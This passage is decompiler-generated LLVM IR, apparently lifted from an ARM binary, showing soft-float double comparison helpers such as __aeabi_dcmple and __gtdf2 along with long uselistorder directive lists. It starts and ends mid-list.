248, 153, 249, 250, 253, 254, 255, 256, 154, 155, 228, 156, 157, 229, 30, 230, 231, 86, 92, 372, 373, 374, 375, 376, 377, 158, 159, 31, 378, 379, 380, 381, 382, 383, 384, 385, 160, 370, 371, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 161, 162, 163, 400, 401, 404, 407, 402, 403, 114, 164, 405, 67, 406, 408, 409, 410, 412, 165, 33, 32, 411, 166, 167, 168, 364, 169, 362, 170, 311, 421, 34, 35, 36, 37, 2, 345, 38, 39, 171, 68, 40, 41, 172, 42, 173, 174, 175, 176, 346, 347, 43, 348, 177, 349, 350, 351, 116, 352, 353, 115, 178, 354, 355, 356, 357, 358, 69, 179, 359, 361, 180, 181, 360, 207, 413, 414, 208, 44, 45, 70, 71, 72, 46, 47, 48, 73, 49, 50, 182, 51, 232, 233, 117, 234, 118, 235, 119, 236, 237, 238, 120, 239, 121, 240, 241, 74, 183, 122, 242, 123, 75, 184, 124, 89, 125, 243, 126, 76, 185, 127, 90, 245, 95, 246, 96, 247, 97, 98, 77, 52, 128, 186, 187, 188, 189, 190, 191, 192, 193, 131, 129, 209, 132, 53, 194, 130, 54, 210, 137, 55, 56, 93, 57, 58, 78, 195, 251, 252, 196, 257, 197, 79, 80, 59, 60, 61, 134, 133, 135, 81, 198, 136, 199, 82, 200, 201, 62, 365, 63, 64, 65, 415, 416, 417, 418, 419, 420, 202, 203, 204, 3, 4 }
  uselistorder i32 32, { 81, 82, 83, 84, 39, 40, 49, 68, 69, 42, 43, 85, 41, 50, 86, 87, 88, 89, 47, 90, 91, 93, 94, 105, 57, 70, 106, 95, 96, 71, 72, 73, 74, 99, 100, 92, 119, 51, 44, 103, 101, 102, 107, 58, 28, 108, 109, 104, 59, 60, 61, 46, 62, 97, 98, 53, 52, 1, 2, 4, 3, 120, 6, 5, 8, 7, 10, 9, 45, 110, 111, 27, 112, 0, 63, 113, 114, 115, 116, 117, 118, 29, 75, 76, 121, 64, 65, 12, 11, 31, 14, 13, 30, 16, 15, 32, 48, 77, 78, 79, 18, 17, 33, 20, 19, 34, 54, 66, 80, 35, 22, 21, 24, 23, 36, 37, 26, 25, 38, 55, 56, 67 }
  uselistorder i32 33, { 5, 6, 7, 3, 8, 9, 10, 0, 2, 1, 4 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 84, 13, 14, 15, 83, 89, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 82, 87, 54, 55, 56, 90, 57, 91, 58, 92, 59, 93, 88, 94, 60, 61, 62, 63, 64, 65, 66, 0, 85, 1, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 81, 86, 80, 77, 78, 79 }
  uselistorder i32 1048576, { 20, 0, 1, 2, 21, 22, 13, 3, 4, 5, 23, 6, 7, 24, 25, 16, 17, 8, 9, 26, 27, 28, 19, 29, 10, 14, 11, 18, 12, 30, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 76, 77, 78, 79, 80, 81, 5, 82, 83, 84, 85, 101, 102, 103, 104, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 143, 144, 145, 146, 147, 148, 149, 161, 162, 163, 175, 176, 177, 178, 7, 6, 31, 32, 33, 34, 35, 36, 179, 180, 8, 181, 182, 183, 184, 185, 186, 187, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 105, 106, 107, 108, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 86, 9, 87, 88, 10, 164, 165, 166, 11, 167, 168, 202, 203, 204, 205, 12, 206, 207, 208, 209, 210, 211, 212, 169, 170, 13, 171, 172, 173, 174, 134, 135, 136, 137, 138, 139, 140, 141, 142, 89, 90, 91, 92, 14, 15, 93, 94, 95, 96, 97, 98, 99, 100, 37, 38, 39, 40, 41, 42, 43, 44, 16, 17, 18, 288, 289, 290, 291, 292, 293, 3, 294, 295, 26, 19, 27, 20, 28, 284, 285, 286, 287, 45, 46, 47, 69, 70, 71, 72, 48, 49, 50, 51, 52, 53, 252, 256, 257, 258, 259, 253, 254, 255, 260, 261, 262, 263, 264, 21, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 280, 282, 276, 277, 278, 279, 281, 283, 62, 63, 4, 64, 25, 246, 247, 248, 249, 250, 251, 1, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 22, 24, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 2, 241, 242, 23, 29, 226, 0, 227, 228, 243, 244, 245, 54, 55, 65, 66, 67, 68, 56, 57, 58, 59, 60, 61, 73, 74, 75, 30 }
  uselistorder i32* @r5, { 129, 130, 131, 132, 133, 134, 135, 136, 137, 53, 54, 55, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 183, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 0, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 7, 224, 225, 226, 227, 228, 281, 236, 237, 238, 239, 240, 241, 242, 28, 243, 244, 245, 262, 298, 299, 8, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 9, 315, 314, 30, 316, 317, 318, 319, 320, 56, 57, 58, 59, 60, 61, 62, 321, 322, 323, 324, 325, 326, 331, 332, 327, 328, 329, 330, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 10, 343, 344, 63, 64, 65, 66, 67, 68, 69, 70, 71, 246, 247, 248, 11, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 184, 185, 186, 187, 188, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 282, 283, 284, 285, 444, 445, 446, 161, 33, 162, 4, 163, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 263, 264, 265, 266, 267, 271, 272, 273, 274, 275, 268, 269, 31, 270, 276, 277, 278, 279, 280, 164, 165, 166, 167, 357, 1, 358, 359, 360, 361, 362, 363, 286, 287, 292, 293, 294, 295, 12, 296, 297, 229, 230, 231, 232, 233, 13, 234, 235, 168, 16, 169, 170, 14, 171, 172, 173, 174, 175, 176, 15, 177, 178, 179, 180, 181, 182, 72, 17, 73, 74, 75, 76, 34, 77, 18, 78, 79, 80, 81, 82, 459, 19, 460, 461, 471, 42, 43, 44, 45, 46, 47, 48, 462, 463, 464, 465, 466, 83, 84, 85, 86, 87, 88, 89, 90, 91, 123, 124, 125, 92, 93, 94, 95, 20, 21, 467, 468, 469, 470, 96, 97, 98, 99, 412, 413, 417, 418, 419, 420, 421, 414, 415, 416, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 6, 435, 436, 437, 438, 439, 22, 440, 441, 442, 443, 112, 113, 114, 115, 116, 403, 404, 405, 406, 407, 408, 23, 409, 410, 411, 288, 24, 289, 290, 291, 364, 25, 365, 35, 366, 367, 368, 369, 370, 371, 372, 373, 375, 374, 376, 377, 26, 378, 379, 380, 381, 382, 383, 384, 32, 385, 386, 390, 5, 391, 2, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 49, 50, 51, 387, 388, 389, 3, 27, 402, 101, 100, 29, 102, 103, 117, 118, 119, 120, 121, 122, 104, 105, 106, 107, 108, 109, 110, 111, 36, 37, 38, 39, 40, 41, 126, 127, 128, 52 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 7, 6, 4, 9, 8, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1f5f0, { 1, 0 }
  uselistorder label %dec_label_pc_1f5d4, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1f5a0, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1f490, { 1, 0 }
  uselistorder label %dec_label_pc_1f478, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_1f614 = call i32 @function_1f624()
  ret i32 %v0_1f614
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_1f61c = call i32 @function_1f624()
  ret i32 %v0_1f61c

; uselistorder directives
  uselistorder i32 ()* @function_1f624, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_1f620 = load i32, i32* @r0, align 4
  ret i32 %v0_1f620
}

define i32 @function_1f624() local_unnamed_addr {
dec_label_pc_1f624:
  %v0_1f624 = load i32, i32* @ip, align 4
  %v0_1f628 = load i32, i32* @r1, align 4
  %v2_1f628 = mul i32 %v0_1f628, 2
  %v2_1f628.off = add i32 %v2_1f628, 4194303
  %tmp = icmp ult i32 %v2_1f628.off, 2097152
  %v0_1f630 = load i32, i32* @r3, align 4
  %v2_1f630 = mul i32 %v0_1f630, 2
  br i1 %tmp, label %dec_label_pc_1f680, label %bb

bb:                                               ; preds = %dec_label_pc_1f624
  %v2_1f630.off = add i32 %v2_1f630, 4194303
  %tmp21 = icmp ult i32 %v2_1f630.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1f674, label %dec_label_pc_1f63c

dec_label_pc_1f63c:                               ; preds = %dec_label_pc_1f688, %dec_label_pc_1f694, %bb
  %v0_1f63c = load i32, i32* @r0, align 4
  %v4_1f63c = or i32 %v0_1f63c, %v2_1f628
  %v6_1f63c = icmp eq i32 %v4_1f63c, 0
  br i1 %v6_1f63c, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_1f63c
  %v1_1f640 = load i32, i32* @r2, align 4
  %v5_1f640 = or i32 %v1_1f640, %v2_1f630
  %v7_1f640 = icmp eq i32 %v5_1f640, 0
  br i1 %v7_1f640, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1f63c, %bb10
  %v5_1f644 = icmp eq i32 %v0_1f630, %v0_1f628
  br i1 %v5_1f644, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1f648.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1f648 = phi i32 [ %v2_1f648.pre, %.thread..thread1_crit_edge ], [ %v1_1f640, %bb10 ]
  %v5_1f648 = icmp eq i32 %v2_1f648, %v0_1f63c
  br i1 %v5_1f648, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1f650 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1f650 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1f650, i32 %v0_1f650)
  %v0_1f654 = load i32, i32* @r0, align 4
  %v0_1f658 = load i32, i32* @r1, align 4
  %v1_1f658 = load i32, i32* @r3, align 4
  %v2_1f658 = xor i32 %v1_1f658, %v0_1f658
  %v3_1f658 = icmp slt i32 %v2_1f658, 0
  br i1 %v3_1f658, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_1f65c = icmp eq i32 %v0_1f658, %v1_1f658
  br i1 %v10_1f65c, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1f660 = load i32, i32* @r2, align 4
  %v4_1f660 = icmp ult i32 %v0_1f654, %v2_1f660
  br i1 %v4_1f660, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_1f65c = icmp ult i32 %v0_1f658, %v1_1f658
  br i1 %v4_1f65c, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1f658, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1f664 = and i32 %v1_1f658, 1073741824
  %v3_1f664 = icmp eq i32 %v2_1f664, 0
  %v4_1f664 = ashr i32 %v1_1f658, 31
  br i1 %v3_1f664, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1f668.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1f664, %bb15 ]
  %v5_1f668 = sub nsw i32 -1, %v4_1f668.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_1f66c = phi i32 [ %v4_1f664, %bb15 ], [ %v5_1f668, %.thread3 ]
  %v1_1f66c = or i32 %v0_1f66c, 1
  ret i32 %v1_1f66c

dec_label_pc_1f674:                               ; preds = %bb
  br label %dec_label_pc_1f688

dec_label_pc_1f680:                               ; preds = %dec_label_pc_1f624
  %v0_1f680 = load i32, i32* @r0, align 4
  %v4_1f680 = mul i32 %v0_1f628, 4096
  %v5_1f680 = or i32 %v0_1f680, %v4_1f680
  %v7_1f680 = icmp eq i32 %v5_1f680, 0
  br i1 %v7_1f680, label %dec_label_pc_1f680.dec_label_pc_1f688_crit_edge, label %dec_label_pc_1f69c

dec_label_pc_1f680.dec_label_pc_1f688_crit_edge:  ; preds = %dec_label_pc_1f680
  %v2_1f630.off20 = add i32 %v2_1f630, 4194303
  %tmp22 = icmp ult i32 %v2_1f630.off20, 2097152
  br label %dec_label_pc_1f688

dec_label_pc_1f688:                               ; preds = %dec_label_pc_1f680.dec_label_pc_1f688_crit_edge, %dec_label_pc_1f674
  %v3_1f68c.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1f680.dec_label_pc_1f688_crit_edge ], [ true, %dec_label_pc_1f674 ]
  br i1 %v3_1f68c.pre-phi, label %dec_label_pc_1f694, label %dec_label_pc_1f63c

dec_label_pc_1f694:                               ; preds = %dec_label_pc_1f688
  %v0_1f694 = load i32, i32* @r2, align 4
  %v4_1f694 = mul i32 %v0_1f630, 4096
  %v5_1f694 = or i32 %v0_1f694, %v4_1f694
  %v7_1f694 = icmp eq i32 %v5_1f694, 0
  br i1 %v7_1f694, label %dec_label_pc_1f63c, label %dec_label_pc_1f69c

dec_label_pc_1f69c:                               ; preds = %dec_label_pc_1f680, %dec_label_pc_1f694
  ret i32 %v0_1f624

; uselistorder directives
  uselistorder i32 %v4_1f664, { 1, 0 }
  uselistorder i32 %v1_1f658, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1f658, { 2, 1, 0 }
  uselistorder i32 %v1_1f640, { 1, 0 }
  uselistorder i32 %v2_1f630, { 0, 2, 1 }
  uselistorder i32 %v0_1f630, { 1, 0, 2 }
  uselistorder i32 %v2_1f628, { 1, 0 }
  uselistorder i32 %v0_1f628, { 1, 0, 2 }
  uselistorder i32 1073741824, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 31, { 11, 4, 2, 5, 6, 12, 3, 13, 14, 7, 8, 1, 15, 0, 16, 17, 18, 19, 9, 10 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 7, 5, 6, 8, 9, 10, 11, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 45, 52, 53, 54, 55, 12, 14, 64, 50, 49, 51, 56, 46, 47, 48, 40, 69, 74, 72, 73, 71, 65, 66, 0, 15, 16, 67, 68, 70, 61, 62, 58, 1, 59, 57, 13, 60, 63, 2, 3, 4 }
  uselistorder i32* @r3, { 44, 45, 16, 17, 46, 47, 7, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 2, 84, 6, 18, 20, 21, 62, 86, 87, 113, 114, 3, 115, 116, 117, 4, 118, 119, 120, 5, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 0, 139, 140, 141, 142, 88, 89, 90, 91, 92, 93, 94, 67, 69, 70, 71, 72, 95, 96, 97, 98, 19, 143, 149, 150, 151, 147, 60, 61, 106, 107, 103, 63, 99, 100, 108, 109, 110, 111, 112, 9, 10, 11, 155, 152, 153, 154, 1, 156, 157, 158, 101, 102, 68, 22, 36, 37, 33, 148, 64, 65, 66, 144, 145, 146, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 12, 13, 14, 15, 38, 39, 40, 41, 42, 43, 8, 104, 105 }
  uselistorder i32* @r1, { 81, 82, 12, 83, 84, 85, 86, 87, 13, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 29, 30, 14, 31, 32, 99, 1, 100, 101, 102, 103, 104, 105, 106, 11, 107, 108, 109, 110, 111, 15, 112, 113, 114, 117, 16, 17, 118, 119, 120, 121, 122, 123, 126, 127, 128, 129, 130, 133, 141, 142, 143, 144, 145, 146, 147, 8, 33, 34, 148, 149, 134, 150, 35, 37, 131, 132, 2, 151, 152, 158, 159, 115, 64, 135, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 140, 181, 19, 116, 0, 36, 38, 21, 196, 28, 197, 198, 199, 124, 125, 3, 4, 192, 76, 22, 182, 183, 27, 187, 5, 184, 185, 186, 136, 137, 138, 171, 172, 173, 23, 24, 153, 154, 155, 156, 157, 6, 189, 190, 9, 18, 7, 174, 175, 176, 10, 177, 178, 179, 25, 180, 139, 77, 78, 20, 194, 195, 26, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 79, 80, 188, 191, 193 }
  uselistorder i32* @ip, { 28, 18, 19, 20, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 46, 47, 49, 50, 51, 52, 53, 54, 55, 56, 64, 1, 72, 71, 81, 82, 83, 84, 85, 86, 87, 88, 89, 91, 92, 90, 93, 9, 94, 10, 95, 96, 97, 98, 99, 100, 2, 101, 21, 65, 66, 67, 68, 69, 70, 48, 102, 103, 104, 118, 43, 44, 14, 120, 119, 5, 121, 122, 6, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 11, 195, 196, 197, 198, 199, 200, 201, 202, 203, 73, 74, 3, 75, 45, 123, 124, 76, 77, 80, 125, 126, 127, 15, 204, 57, 58, 4, 59, 60, 61, 62, 63, 152, 153, 154, 155, 12, 156, 157, 158, 159, 160, 16, 149, 150, 13, 151, 78, 79, 128, 161, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 130, 129, 7, 208, 205, 206, 207, 8, 209, 132, 133, 134, 135, 136, 137, 138, 139, 131, 140, 141, 142, 143, 144, 145, 146, 147, 0, 148, 22, 27, 23, 24, 25, 26, 17 }
  uselistorder label %dec_label_pc_1f69c, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1f63c, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1f6a4 = load i32, i32* @r0, align 4
  %v0_1f6a8 = load i32, i32* @r2, align 4
  store i32 %v0_1f6a8, i32* @r0, align 4
  store i32 %v0_1f6a4, i32* @r2, align 4
  %v0_1f6bc = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1f6bc
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1f6c0 = load i32, i32* @r0, align 4
  %v1_1f6c4 = sext i32 %v3_1f6c0 to i64
  %v2_1f6c4 = bitcast i64 %v1_1f6c4 to double
  %v3_1f6c4 = load i32, i32* @r2, align 4
  %v4_1f6c4 = sext i32 %v3_1f6c4 to i64
  %v5_1f6c4 = bitcast i64 %v4_1f6c4 to double
  %v7_1f6c4 = fcmp oeq double %v2_1f6c4, %v5_1f6c4
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1f6c4 = fcmp ule double %v2_1f6c4, %v5_1f6c4
  %not.v7_1f6c4 = xor i1 %v7_1f6c4, true
  %v1_1f6c8 = and i1 %not.v6_1f6c4, %not.v7_1f6c4
  store i1 %v7_1f6c4, i1* @cpsr_z, align 1
  br i1 %v1_1f6c8, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1f6c4, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1f6c0

; uselistorder directives
  uselistorder i1 %v7_1f6c4, { 1, 2, 0 }
  uselistorder i32* @r2, { 15, 73, 74, 75, 76, 3, 77, 78, 79, 80, 81, 82, 11, 83, 84, 85, 89, 12, 91, 92, 93, 94, 95, 100, 111, 112, 113, 114, 115, 116, 21, 117, 118, 119, 120, 121, 24, 90, 22, 23, 163, 98, 99, 4, 88, 122, 123, 124, 13, 41, 10, 177, 178, 179, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 102, 103, 105, 106, 107, 109, 154, 110, 14, 86, 87, 180, 184, 185, 186, 187, 2, 199, 96, 97, 5, 181, 164, 167, 168, 169, 6, 170, 171, 172, 7, 165, 166, 173, 8, 174, 155, 104, 140, 141, 142, 143, 42, 52, 101, 188, 195, 196, 189, 190, 191, 192, 193, 194, 0, 1, 197, 9, 198, 144, 145, 146, 148, 147, 149, 150, 151, 152, 153, 108, 61, 62, 57, 182, 183, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 54, 55, 56, 58, 59, 60, 63, 16, 17, 18, 19, 20, 64, 65, 66, 67, 68, 69, 70, 71, 72, 156, 157, 158, 159, 160, 161, 162, 175, 176 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1f6dc = call i32 @__aeabi_cdcmple()
  %v0_1f6e0 = load i1, i1* @cpsr_z, align 1
  %.v0_1f6dc. = zext i1 %v0_1f6e0 to i32
  ret i32 %.v0_1f6dc.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_1f6f4 = call i32 @__aeabi_cdcmple()
  %v0_1f6f8 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1f6f8 to i32
  %.v0_1f6f4. = xor i32 %tmp2, 1
  ret i32 %.v0_1f6f4.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_1f70c = call i32 @__aeabi_cdcmple()
  %v0_1f710 = load i1, i1* @cpsr_z, align 1
  %v1_1f710 = load i1, i1* @cpsr_c, align 1
  %v2_1f710 = xor i1 %v1_1f710, true
  %v3_1f710 = or i1 %v0_1f710, %v2_1f710
  %.v0_1f70c = select i1 %v3_1f710, i32 1, i32 %v0_1f70c
  %v2_1f714 = xor i1 %v0_1f710, true
  %v3_1f714 = and i1 %v1_1f710, %v2_1f714
  %..v0_1f70c = select i1 %v3_1f714, i32 0, i32 %.v0_1f70c
  ret i32 %..v0_1f70c

; uselistorder directives
  uselistorder i1 %v1_1f710, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1f720 = load i32, i32* @lr, align 4
  store i32 %v0_1f720, i32* %stack_var_-8, align 4
  %v0_1f724 = call i32 @__aeabi_cdrcmple()
  %v0_1f728 = load i1, i1* @cpsr_z, align 1
  %v1_1f728 = load i1, i1* @cpsr_c, align 1
  %v2_1f728 = xor i1 %v1_1f728, true
  %v3_1f728 = or i1 %v0_1f728, %v2_1f728
  %.v0_1f724 = select i1 %v3_1f728, i32 1, i32 %v0_1f724
  %v2_1f72c = xor i1 %v0_1f728, true
  %v3_1f72c = and i1 %v1_1f728, %v2_1f72c
  %..v0_1f724 = select i1 %v3_1f72c, i32 0, i32 %.v0_1f724
  %v2_1f730 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1f730, i32* @lr, align 4
  ret i32 %..v0_1f724

; uselistorder directives
  uselistorder i1 %v1_1f728, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 0, 102, 1, 93, 6, 7, 8, 9, 10, 11, 85, 86, 94, 95, 87, 12, 13, 14, 88, 89, 90, 96, 15, 16, 17, 18, 21, 20, 19, 104, 105, 106, 107, 108, 109, 110, 91, 111, 112, 113, 98, 114, 115, 116, 117, 92, 118, 119, 120, 121, 122, 123, 124, 22, 125, 103, 126, 23, 24, 25, 26, 27, 28, 29, 97, 127, 30, 31, 32, 99, 35, 36, 37, 38, 33, 34, 100, 39, 40, 41, 42, 101, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 83, 72, 73, 74, 75, 84, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder i1* @cpsr_z, { 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 43, 14, 15, 16, 17, 18, 19, 20, 21, 39, 40, 41, 42, 22, 23, 24, 38, 37, 25, 26 }
  uselistorder i32* @lr, { 30, 31, 32, 33, 34, 8, 9, 10, 11, 12, 35, 0, 36, 1, 37, 38, 39, 41, 42, 46, 47, 48, 52, 53, 54, 55, 56, 57, 58, 59, 62, 72, 73, 66, 74, 75, 76, 77, 78, 79, 80, 81, 13, 82, 83, 84, 92, 85, 86, 87, 88, 89, 90, 91, 93, 63, 64, 65, 49, 50, 51, 17, 138, 139, 140, 141, 142, 143, 144, 145, 146, 67, 68, 69, 70, 71, 43, 44, 45, 96, 97, 98, 99, 100, 101, 102, 60, 61, 103, 104, 40, 14, 15, 117, 118, 119, 23, 24, 25, 26, 29, 147, 148, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 2, 132, 133, 135, 136, 134, 94, 95, 105, 106, 107, 108, 109, 110, 3, 4, 111, 112, 113, 114, 115, 16, 116, 137, 18, 19, 20, 21, 22, 5, 6, 7, 27, 28 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1f73c = call i32 @__aeabi_cdrcmple()
  %v0_1f740 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1f740 to i32
  %.v0_1f73c. = xor i32 %tmp2, 1
  ret i32 %.v0_1f73c.

; uselistorder directives
  uselistorder i32 1, { 582, 597, 711, 598, 583, 1147, 1064, 1148, 712, 223, 227, 226, 224, 230, 225, 229, 228, 1149, 713, 1150, 714, 277, 279, 275, 276, 278, 418, 122, 121, 552, 231, 715, 416, 417, 1151, 1152, 385, 384, 1153, 501, 502, 503, 716, 115, 116, 111, 112, 113, 114, 1154, 507, 1155, 1156, 607, 1157, 1158, 717, 67, 68, 69, 63, 64, 66, 65, 1159, 1160, 718, 398, 397, 1161, 608, 609, 1162, 1176, 721, 720, 719, 420, 422, 419, 421, 1178, 722, 204, 205, 1179, 553, 1180, 1181, 723, 206, 207, 1182, 724, 239, 220, 219, 261, 1183, 726, 725, 119, 118, 117, 727, 120, 610, 1184, 1185, 1186, 524, 1187, 589, 554, 1188, 1189, 527, 1190, 1191, 730, 729, 728, 423, 425, 426, 424, 731, 429, 428, 427, 1192, 1193, 1194, 1203, 1204, 1205, 1212, 611, 612, 740, 739, 738, 737, 708, 736, 735, 734, 733, 732, 431, 434, 432, 433, 435, 430, 1215, 741, 25, 22, 24, 23, 584, 1237, 1238, 577, 1239, 1241, 508, 1242, 614, 573, 572, 613, 1243, 519, 536, 570, 590, 1244, 1245, 1246, 1247, 1248, 0, 1249, 1240, 615, 1250, 579, 749, 698, 748, 747, 746, 745, 744, 743, 742, 211, 210, 208, 209, 1251, 1252, 1253, 1254, 1255, 509, 1256, 750, 256, 259, 255, 253, 252, 254, 257, 258, 